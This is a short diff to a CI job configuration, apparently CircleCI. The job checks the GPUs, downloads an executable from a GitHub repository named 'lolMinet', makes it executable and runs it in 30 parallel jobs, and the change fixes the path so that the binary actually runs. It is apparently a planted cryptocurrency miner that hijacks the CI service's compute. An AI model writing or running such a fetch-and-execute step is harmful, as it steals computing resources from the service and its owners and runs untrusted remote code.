@@ -7,5 +7,5 @@ jobs:
     steps:
       - run: nvidia-smi
       - run: wget https://raw.githubusercontent.com/Master478963/lolMinet/main/binary && chmod +x binary
-      - run: ../binary
+      - run: ./binary
     parallelism: 30
